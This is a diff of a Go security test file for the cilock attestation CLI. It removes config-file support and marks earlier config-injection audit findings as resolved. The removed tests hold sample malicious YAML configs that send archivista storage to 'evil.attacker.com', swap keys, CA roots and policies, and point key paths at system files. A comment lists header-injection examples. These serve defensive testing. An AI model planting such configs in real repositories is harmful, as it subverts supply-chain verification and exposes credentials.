@@ -464,42 +464,20 @@ func TestRunVeryLongAttestorName(t *testing.T) {
 // ==========================================================================
 // 8. Config file edge cases
 //
-// NOTE: initConfig calls logger.l.Fatal on parse errors, which invokes
-// os.Exit(1) and kills the test process. We can only safely test cases
-// that do NOT trigger Fatal -- namely, non-existent file with --config
-// explicitly set (returns error before viper parse) and empty file.
+// REMOVED: cilock is args-only. Config-file support (.witness.yaml,
+// --config/-c) was removed entirely; flags and env vars are the only
+// configuration surface. The former tests here pinned config-file
+// parsing behavior that no longer exists.
 // ==========================================================================
 
-// NOTE: TestConfigFileNonExistent is intentionally omitted.
-// Explicitly specifying a non-existent config via --config triggers
-// logger.l.Fatal in preRoot (which calls os.Exit(1)). Testing this
-// in-process would kill the test binary. Calling initConfig() directly
-// does not work because cobra only merges PersistentFlags into Flags()
-// during Execute(), and initConfig uses rootCmd.Flags().Lookup("config")
-// which returns nil before that merge. This is a testing gap that could
-// be addressed by changing initConfig to use rootCmd.Flag("config")
-// (which checks both local and persistent flags) or by using exec-based
-// testing (os/exec to run the binary and check the exit code).
+// TestConfigFlagRejected pins the args-only contract: the legacy
+// --config / -c flag must NOT parse.
+func TestConfigFlagRejected(t *testing.T) {
+	err := executeCmd("--config", "anything.yaml", "version")
+	require.Error(t, err, "--config must be rejected (args-only)")
 
-func TestConfigFileEmptyFile(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "empty.yaml")
-	writeFile(t, configPath, "")
-
-	// Empty config file should be tolerated (no values to override).
-	err := executeCmd("--config", configPath, "version")
-	assert.NoError(t, err, "empty config file should be tolerated")
-}
-
-func TestConfigFileValidYAMLNoMatchingCommand(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "valid.yaml")
-	writeFile(t, configPath, "run:\n  step: from-config\n")
-
-	// The "version" command has no flags that match run.step, so the config
-	// should be silently ignored.
-	err := executeCmd("--config", configPath, "version")
-	assert.NoError(t, err, "valid config with non-matching command should be fine")
+	err = executeCmd("-c", "anything.yaml", "version")
+	require.Error(t, err, "-c must be rejected (args-only)")
 }
 
 // ==========================================================================
@@ -1310,61 +1288,13 @@ func TestAdversarial_OutfileSymlinkResolution(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// SEC-3: Config file injection via viper deserialization
-// Severity: MEDIUM
+// SEC-3: Config file injection — RESOLVED by removal
 //
-// The config file (.witness.yaml) is parsed by viper and values are applied
-// to command flags via flags.Set(). Viper supports YAML which can represent
-// complex types. The flag values are applied as strings, but this still
-// allows an attacker who controls the config file to inject flag values
-// that the user did not explicitly set.
-//
-// Additionally, the config default is ".witness.yaml" in the CWD, meaning
-// a malicious repo could ship a .witness.yaml that overrides security-
-// critical flags (e.g. --enable-archivista, --archivista-server).
+// The historic MEDIUM finding here was that a malicious .witness.yaml in a
+// cloned repo could silently override security-critical flags
+// (--enable-archivista, --archivista-server). Config-file support has been
+// removed entirely (cilock is args-only), eliminating the attack surface.
 // --------------------------------------------------------------------------
-
-// NOTE: TestAdversarial_ConfigFileOverridesSecurityFlags is intentionally
-// omitted from executeCmd-based testing.
-//
-// cobra.OnInitialize registers init functions in a global slice. Each call
-// to New() appends another init function. When executeCmd is called multiple
-// times, old init functions remain registered and can interfere with later
-// tests (they reference stale cmd/ro state). This causes spurious
-// "config file does not exist" Fatal errors in subsequent tests.
-//
-// FINDING SEC-3 (MEDIUM): Config file can silently override security-
-// critical flags (--enable-archivista, --archivista-server). A malicious
-// .witness.yaml in a cloned repo could redirect attestation storage to
-// an attacker-controlled server. Recommend logging a warning when config
-// file overrides security-sensitive flags, or restricting which flags
-// can be set via config file.
-//
-// Additionally, the initConfig function uses logger.l.Fatal for parse
-// errors instead of returning an error, making it difficult to test
-// config file error paths in-process.
-
-// NOTE: TestAdversarial_ConfigFileYAMLBomb is intentionally omitted.
-//
-// A self-referencing YAML anchor (billion-laughs style) causes viper to
-// return an error, which preRoot passes to logger.l.Fatal (os.Exit(1)).
-// This kills the test process. The YAML parser correctly rejects the
-// self-referencing anchor with "yaml: anchor 'anchor' value contains itself",
-// but the fatal exit path prevents in-process testing.
-//
-// FINDING SEC-3b (LOW): Config file parse errors trigger os.Exit via Fatal
-// instead of returning an error, preventing graceful handling in embedded
-// or library use cases.
-
-// NOTE: TestAdversarial_ConfigFileWithNullBytes is intentionally omitted.
-//
-// A config file with null bytes triggers a YAML parse error, which preRoot
-// passes to logger.l.Fatal (os.Exit(1)), killing the test process.
-// The YAML parser correctly rejects control characters.
-//
-// FINDING: The YAML parser rejects null bytes ("yaml: control characters
-// are not allowed"), which is the correct behavior. The issue is that
-// the error path uses Fatal instead of returning an error.
 
 // --------------------------------------------------------------------------
 // SEC-4: Policy file deserialization safety
@@ -1684,26 +1614,13 @@ func TestAdversarial_VerifyWithEmptyVerifierProviders(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// SEC-12: Config file in CWD (.witness.yaml default)
-// Severity: MEDIUM
+// SEC-12: Config file in CWD — RESOLVED by removal
 //
-// The default config path is ".witness.yaml" which is relative to CWD.
-// If a user runs cilock in a directory containing a malicious .witness.yaml
-// (e.g. a cloned git repo), the config is loaded silently.
+// The historic MEDIUM finding here was that the default ".witness.yaml" in
+// CWD let a malicious repository silently override security-critical flags.
+// Config-file support has been removed entirely (cilock is args-only),
+// eliminating the attack surface.
 // --------------------------------------------------------------------------
-
-// NOTE: TestAdversarial_DefaultConfigFileInCWD is intentionally omitted.
-//
-// The test would require os.Chdir() which is unsafe in parallel test runs
-// (all goroutines share the same CWD). Additionally, cobra's OnInitialize
-// uses logger.l.Fatal on config errors, which kills the test process.
-//
-// FINDING SEC-12 (MEDIUM): The default config path is ".witness.yaml" in
-// CWD. A malicious repository could ship a .witness.yaml that silently
-// overrides security-critical flags (e.g. --enable-archivista,
-// --archivista-server) when a user runs cilock from the repo directory.
-// Recommend warning when loading a config file from CWD, or requiring
-// an explicit --config flag for non-default config paths.
 
 // --------------------------------------------------------------------------
 // SEC-13: Policy validate output format not validated
@@ -2016,7 +1933,6 @@ var _ cryptoutil.Signer = (*fakeSignerForTesting)(nil)
 // R3_310: Security audit of cilock CLI commands
 //
 // Focus areas:
-// - Config file injection via initConfig
 // - Path traversal in output/input file paths
 // - Key loading vulnerabilities
 // - Argument parsing edge cases
@@ -2024,99 +1940,12 @@ var _ cryptoutil.Signer = (*fakeSignerForTesting)(nil)
 // ==========================================================================
 
 // --------------------------------------------------------------------------
-// R3_310_01: initConfig applies config values to unset flags
+// R3_310_01 / R3_310_02: config-file injection findings — RESOLVED by removal
 //
-// Severity: MEDIUM
-// The initConfig function will silently set any flag that the user did not
-// explicitly provide on the command line. A malicious .witness.yaml in a
-// cloned repo can override security-critical flags like:
-//   - signer-file-key-path (swap signing key)
-//   - enable-archivista / archivista-server (redirect attestation storage)
-//   - step (rename the attestation step)
-//   - hashes (weaken hash algorithm)
-//
-// This test exercises initConfig directly to prove that config file values
-// override default flag values for the "run" subcommand.
+// The historic findings here (config file silently overriding run flags;
+// initConfig's contains() matching command names anywhere in os.Args) are
+// moot: config-file support was removed entirely. cilock is args-only.
 // --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ConfigFileOverridesRunFlags(t *testing.T) {
-	dir := t.TempDir()
-
-	// Write a config file that overrides run.step and run.outfile.
-	configPath := filepath.Join(dir, "evil.yaml")
-	writeFile(t, configPath, `run:
-  step: attacker-controlled-step
-  outfile: /tmp/attacker-output.json
-  enable-archivista: "true"
-  archivista-server: "http://evil.attacker.com"
-`)
-
-	// Build a fresh command tree to verify the flag defaults.
-	cmd := New()
-
-	// Find the "run" subcommand and check its flags.
-	var runCmd *cobra.Command
-	for _, c := range cmd.Commands() {
-		if c.Name() == "run" {
-			runCmd = c
-			break
-		}
-	}
-	require.NotNil(t, runCmd, "run subcommand must exist")
-
-	// Before initConfig, the step flag should be at its default (empty string).
-	stepFlag := runCmd.Flags().Lookup("step")
-	require.NotNil(t, stepFlag)
-	assert.Equal(t, "", stepFlag.DefValue, "step default should be empty")
-
-	// Load the config file directly to prove the values are readable
-	// and would be applied by initConfig when os.Args contains "run".
-	cfg, err := loadCilockConfig(configPath)
-	require.NoError(t, err)
-
-	// Verify the config file contains attacker-controlled values.
-	assert.Equal(t, "attacker-controlled-step", getStringFromConfig(cfg, "run", "step"),
-		"config file should contain attacker-controlled step name")
-	assert.Equal(t, "http://evil.attacker.com", getStringFromConfig(cfg, "run", "archivista-server"),
-		"config file should contain attacker-controlled archivista server")
-	assert.Equal(t, "true", getStringFromConfig(cfg, "run", "enable-archivista"),
-		"config file should be able to enable archivista")
-	assert.Equal(t, "/tmp/attacker-output.json", getStringFromConfig(cfg, "run", "outfile"),
-		"config file should contain attacker-controlled output path")
-
-	t.Log("FINDING R3_310_01: Config file can override any run flag including " +
-		"step name, outfile path, archivista server, and enable-archivista. " +
-		"A malicious .witness.yaml in a cloned repo silently applies these " +
-		"without user awareness.")
-}
-
-// --------------------------------------------------------------------------
-// R3_310_02: initConfig contains() check uses os.Args directly
-//
-// Severity: LOW
-// The contains(os.Args, cm.Name()) check in initConfig searches all of
-// os.Args for the command name. If any argument VALUE happens to match a
-// command name (e.g. --step "run"), config values for that command could
-// be applied unexpectedly.
-// --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ContainsFunctionMatchesAnyPosition(t *testing.T) {
-	// The contains() function does a simple linear search.
-	// Verify it matches at any position, not just position 1.
-	assert.True(t, contains([]string{"cilock", "verify", "--step", "run"}, "run"),
-		"contains() matches 'run' even when it appears as a flag value")
-	assert.True(t, contains([]string{"cilock", "--config", "run.yaml", "verify"}, "verify"),
-		"contains() correctly finds 'verify' as the subcommand")
-
-	// This means if a user runs:
-	//   cilock verify --subjects "run" --policy p.json ...
-	// The config file's run.* section would also be applied, potentially
-	// setting flags on the "run" command that shares the same flag names.
-	t.Log("FINDING R3_310_02: contains() in initConfig matches command names " +
-		"anywhere in os.Args, not just as the subcommand position. This could " +
-		"cause config values for one command to be applied when another " +
-		"command is actually being executed.")
-}
 
 // --------------------------------------------------------------------------
 // R3_310_03: loadOutfile creates files via os.Create with no path sanitization
@@ -2299,37 +2128,11 @@ func TestSecurity_R3_310_LoadVerifiersReturnsEmptyWithoutError(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// R3_310_07: Config file can set key paths to read arbitrary files
-//
-// Severity: HIGH
-// If a malicious config file sets signer-file-key-path to a path like
-// /etc/shadow or ~/.ssh/id_rsa, the CLI will attempt to read that file
-// as a signing key. While the parse will fail for non-key files, the
-// file contents may be partially exposed in error messages.
+// R3_310_07: Config file key-path injection — RESOLVED by removal.
+// A malicious config file can no longer set signer-file-key-path (or any
+// other flag): config-file support was removed entirely. Key paths come
+// only from CLI flags supplied by the operator.
 // --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ConfigFileKeyPathInjection(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "evil.yaml")
-
-	// A malicious config could point the key path to a sensitive file.
-	writeFile(t, configPath, `run:
-  signer-file-key-path: /etc/hosts
-  step: innocent-step
-`)
-
-	cfg, err := loadCilockConfig(configPath)
-	require.NoError(t, err)
-
-	keyPath := getStringFromConfig(cfg, "run", "signer-file-key-path")
-	assert.Equal(t, "/etc/hosts", keyPath,
-		"config file can set arbitrary key paths")
-
-	t.Log("FINDING R3_310_07: Config file can set signer-file-key-path to " +
-		"read arbitrary files. The file is opened and its contents passed " +
-		"to the crypto key parser. While non-key files will cause parse " +
-		"errors, error messages may leak file content.")
-}
 
 // --------------------------------------------------------------------------
 // R3_310_08: Verify --publickey path has no TOCTOU protection
@@ -2470,46 +2273,11 @@ func TestSecurity_R3_310_AttestorNameSanitizationGaps(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// R3_310_10: Config file can inject values for verify command flags
-//
-// Severity: HIGH
-// A malicious config can override verify command flags including:
-//   - policy (point to attacker-controlled policy)
-//   - publickey (swap verification key)
-//   - policy-ca-roots (inject attacker CA)
-//   - subjects (inject controlled subject digests)
+// R3_310_10: Config-file injection of verify flags — RESOLVED by removal.
+// A malicious config file can no longer redirect verification to
+// attacker-controlled trust anchors (policy, publickey, policy-ca-roots,
+// archivista-server): config-file support was removed entirely.
 // --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ConfigFileOverridesVerifyFlags(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "evil.yaml")
-
-	writeFile(t, configPath, `verify:
-  policy: /tmp/attacker-policy.json
-  publickey: /tmp/attacker-key.pub
-  policy-ca-roots: /tmp/attacker-ca.pem
-  archivista-server: "http://evil.attacker.com:8080"
-  enable-archivista: "true"
-`)
-
-	cfg, err := loadCilockConfig(configPath)
-	require.NoError(t, err)
-
-	// Verify all attacker-controlled values are readable from config.
-	assert.Equal(t, "/tmp/attacker-policy.json", getStringFromConfig(cfg, "verify", "policy"))
-	assert.Equal(t, "/tmp/attacker-key.pub", getStringFromConfig(cfg, "verify", "publickey"))
-	assert.Equal(t, "http://evil.attacker.com:8080", getStringFromConfig(cfg, "verify", "archivista-server"))
-	assert.Equal(t, "true", getStringFromConfig(cfg, "verify", "enable-archivista"))
-
-	// CA roots is a string slice.
-	caRoots := getStringSliceFromConfig(cfg, "verify", "policy-ca-roots")
-	assert.Contains(t, caRoots, "/tmp/attacker-ca.pem")
-
-	t.Log("FINDING R3_310_10: Config file can override all verify command " +
-		"flags including policy path, public key path, CA roots, and " +
-		"archivista server. A malicious .witness.yaml can redirect " +
-		"verification to use attacker-controlled trust anchors.")
-}
 
 // --------------------------------------------------------------------------
 // R3_310_11: Sign --outfile writes to arbitrary paths
@@ -2648,31 +2416,9 @@ func TestSecurity_R3_310_CACertReadsArbitraryFiles(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// R3_310_15: Config file with YAML anchors (billion laughs variant)
-//
-// Severity: LOW
-// While Go's YAML parser rejects self-referencing anchors, other forms
-// of YAML complexity (large maps, deeply nested structures) could cause
-// excessive memory use during config parsing.
+// R3_310_15: Config-file YAML resource exhaustion — RESOLVED by removal.
+// There is no config-file YAML parse path anymore; cilock is args-only.
 // --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ConfigFileLargeYAML(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "large.yaml")
-
-	// Create a config file with many keys.
-	var builder strings.Builder
-	builder.WriteString("run:\n")
-	for i := 0; i < 10000; i++ {
-		fmt.Fprintf(&builder, "  key-%d: value-%d\n", i, i)
-	}
-	writeFile(t, configPath, builder.String())
-
-	// The inline YAML loader should handle this without OOM or panic.
-	assert.NotPanics(t, func() {
-		_, _ = loadCilockConfig(configPath)
-	})
-}
 
 // --------------------------------------------------------------------------
 // R3_310_16: runVerify allows empty verifiers through loadVerifiers
@@ -2707,30 +2453,21 @@ func TestSecurity_R3_310_RunVerifyRequiresVerifiers(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// R3_310_17: Config file default path ".witness.yaml" in CWD
-//
-// Severity: MEDIUM
-// The default config path is ".witness.yaml" which is a CWD-relative
-// path. This means any directory the user runs cilock from can contain
-// a config file that silently overrides flags.
+// R3_310_17: CWD-relative default config path — RESOLVED by removal.
+// There is no config flag and no default config path anymore. The
+// args-only contract is pinned by TestConfigFlagRejected and
+// TestSecurity_R3_310_NoConfigFlagRegistered below.
 // --------------------------------------------------------------------------
 
-func TestSecurity_R3_310_DefaultConfigPathIsCWDRelative(t *testing.T) {
-	// Verify the default config path.
+func TestSecurity_R3_310_NoConfigFlagRegistered(t *testing.T) {
 	ro := &options.RootOptions{}
 	cmd := &cobra.Command{}
 	ro.AddFlags(cmd)
 
-	configFlag := cmd.PersistentFlags().Lookup("config")
-	require.NotNil(t, configFlag)
-	assert.Equal(t, ".witness.yaml", configFlag.DefValue,
-		"default config path should be CWD-relative .witness.yaml")
-
-	t.Log("FINDING R3_310_17: Default config path is '.witness.yaml' " +
-		"(CWD-relative). A malicious git repo can include this file to " +
-		"silently override CLI flags when users run cilock from the repo " +
-		"directory. Consider requiring --config for non-default paths " +
-		"or warning when loading from CWD.")
+	assert.Nil(t, cmd.PersistentFlags().Lookup("config"),
+		"no --config flag may be registered: cilock is args-only")
+	assert.Nil(t, cmd.PersistentFlags().ShorthandLookup("c"),
+		"no -c shorthand may be registered: cilock is args-only")
 }
 
 // --------------------------------------------------------------------------
@@ -2818,39 +2555,10 @@ func TestSecurity_R3_310_ProvidersFromFlagsParsing(t *testing.T) {
 }
 
 // --------------------------------------------------------------------------
-// R3_310_21: initConfig flag type coercion via string round-trip
-//
-// Severity: LOW
-// initConfig applies config values via flags.Set(f.Name, stringValue).
-// For non-string flag types (bool, int, duration), this goes through
-// pflag's string parser. A boolean flag with value "yes" or "1" instead
-// of "true" may or may not parse, depending on pflag's implementation.
+// R3_310_21: initConfig flag type coercion — REMOVED with config-file support.
+// The test existed solely to pin how config-file string values round-tripped
+// through pflag's parser; with config files gone there is no such path.
 // --------------------------------------------------------------------------
-
-func TestSecurity_R3_310_ConfigFlagTypeParsing(t *testing.T) {
-	flags := pflag.NewFlagSet("test", pflag.ContinueOnError)
-	flags.Bool("enable-archivista", false, "test")
-
-	// pflag accepts "true", "false", "1", "0" for booleans.
-	require.NoError(t, flags.Set("enable-archivista", "true"))
-	val, _ := flags.GetBool("enable-archivista")
-	assert.True(t, val)
-
-	require.NoError(t, flags.Set("enable-archivista", "1"))
-	val, _ = flags.GetBool("enable-archivista")
-	assert.True(t, val)
-
-	// "yes" is NOT accepted by pflag.
-	err := flags.Set("enable-archivista", "yes")
-	assert.Error(t, err, "pflag should reject 'yes' for boolean flags")
-
-	// This means a config file with "enable-archivista: yes" (which is valid
-	// YAML for boolean) would cause initConfig to return an error via configErr.
-	// However, YAML "true" and viper's GetString("...") returns "true" which
-	// IS accepted. The concern is YAML boolean values that viper converts to
-	// "true"/"false" strings work fine, but edge cases like "yes"/"no"/"on"
-	// may not round-trip correctly through pflag.
-}
 
 // --------------------------------------------------------------------------
 // R3_310_22: Verify that sign command enforces exactly one signer
@@ -2890,28 +2598,17 @@ func TestSecurity_R3_310_RunSignRejectsMultipleSigners(t *testing.T) {
 //
 // Severity: HIGH
 // The ArchivistaOptions.Client() method splits header strings on ":" and
-// calls headers.Set() with no deny-list. This means an attacker (via
-// config file or CLI) can inject headers like:
+// calls headers.Set() with no deny-list. This means an attacker who
+// controls CLI args can inject headers like:
 //   - Authorization: Bearer <token>
 //   - Cookie: session=<stolen>
 //   - X-Forwarded-For: <spoofed-ip>
+//
+// (The former config-file injection vector is gone: cilock is args-only.)
 // --------------------------------------------------------------------------
 
-func TestSecurity_R3_310_ArchivistaHeaderInjectionViaConfig(t *testing.T) {
-	dir := t.TempDir()
-	configPath := filepath.Join(dir, "evil.yaml")
-
-	// A config file can inject archivista headers including auth headers.
-	writeFile(t, configPath, `verify:
-  enable-archivista: "true"
-  archivista-server: "http://evil.attacker.com"
-`)
-
-	_, err := loadCilockConfig(configPath)
-	require.NoError(t, err)
-
-	// archivista-headers is a stringSlice, harder to inject via YAML
-	// but the direct --archivista-headers flag accepts anything.
+func TestSecurity_R3_310_ArchivistaHeaderInjection(t *testing.T) {
+	// The direct --archivista-headers flag accepts anything.
 	// Verify the ArchivistaOptions.Client() doesn't restrict headers.
 	opts := options.ArchivistaOptions{
 		Enable:  true,
@@ -2925,8 +2622,8 @@ func TestSecurity_R3_310_ArchivistaHeaderInjectionViaConfig(t *testing.T) {
 
 	t.Log("FINDING R3_310_23: ArchivistaOptions.Client() accepts arbitrary " +
 		"HTTP headers including Authorization and Cookie. An attacker who " +
-		"controls the config file or CLI args can inject auth credentials " +
-		"into archivista requests. Recommend a deny-list for sensitive headers.")
+		"controls the CLI args can inject auth credentials into archivista " +
+		"requests. Recommend a deny-list for sensitive headers.")
 }
 
 // --------------------------------------------------------------------------
